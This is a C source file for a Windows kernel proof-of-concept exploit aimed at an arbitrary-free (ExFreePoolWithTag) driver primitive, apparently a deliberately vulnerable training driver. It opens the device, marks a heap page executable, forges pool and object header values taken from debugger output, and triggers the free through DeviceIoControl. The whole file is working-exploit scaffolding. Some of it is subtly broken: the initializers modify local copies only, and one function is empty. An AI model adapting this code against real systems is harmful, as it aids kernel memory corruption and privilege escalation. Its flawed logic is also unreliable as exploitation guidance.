#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char* memory_page = (void*)0;
	POOL_HEADER pool_header;
	char output[256];
	unsigned long bytes_returned = 0L, old_protection = 0L;

	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s\n[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the process heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the process heap. Allocation Address: 0x%p", memory_page);

	if (!VirtualProtect(memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	initialize_pool_header(&pool_header);
	printf("\n[+] Initialized fake pool header.");

	DeviceIoControl(h_driver, TARGET_IOCTL, &memory_page, sizeof(long long), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Free'd target pool address.\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffaa0b73f0dae0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x17;					// +0x002 BlockSize        : 0y00010111 (0x17)
	pool_header.PoolType = 0x2;						// +0x002 PoolType         : 0y00000010 (0x2)
	pool_header.Ulong1 = 0x2170000;					// +0x000 Ulong1           : 0x2170000
	pool_header.PoolTag = 0x70707746;				// +0x004 PoolTag          : 0x70707746
	pool_header.AllocatorBackTraceIndex = 0x6B5E;	// +0x008 AllocatorBackTraceIndex : 0x6b5e
	pool_header.PoolTagHash = 0x9417;				// +0x00a PoolTagHash      : 0x9417
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota; // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffaa0b73f0dae0+8

	object_header_quota.PagedPoolCharge = 0x94176B5E;					   // +0x000 PagedPoolCharge  : 0x94176b5e
	object_header_quota.NonPagedPoolCharge = 0xDE0E839E;				   // +0x004 NonPagedPoolCharge : 0xde0e839e
	object_header_quota.SecurityDescriptorCharge = 0x73F132A0;			   // +0x008 SecurityDescriptorCharge : 0x73f132a0
	object_header_quota.Reserved1 = 0xFFFFAA0B;							   // +0x00c Reserved1        : 0xffffaa0b
	object_header_quota.SecurityDescriptorQuotaBlock = 0xFFFF8407C9848D78; // +0x010 SecurityDescriptorQuotaBlock : 0xffff8407`c9848d78 Void
	object_header_quota.Reserved2 = 0;									   // +0x018 Reserved2        : 0
}

void initialize_object_header(POBJECT_HEADER input_object_header)
{
	OBJECT_HEADER object_header = *input_object_header; // dt nt!_OBJECT_HEADER ffffaa0b73f0dae0+8+10
}